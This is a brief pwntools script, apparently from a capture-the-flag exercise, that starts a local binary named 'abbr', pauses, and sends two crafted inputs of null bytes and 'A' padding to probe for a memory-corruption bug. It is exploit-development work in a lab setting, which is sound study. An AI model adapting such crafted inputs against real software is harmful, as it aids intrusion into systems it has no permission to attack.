from pwn import *

io = process('./abbr')

def abbr(text):
    print(io.recv())
    io.sendline(text)

pause()
abbr('\0\0\0\0\0AAAAAAAA\0\0\0\0')
abbr('\0\0\0\0\0AAAAAAAAAAAA\0\0\0\0\0')
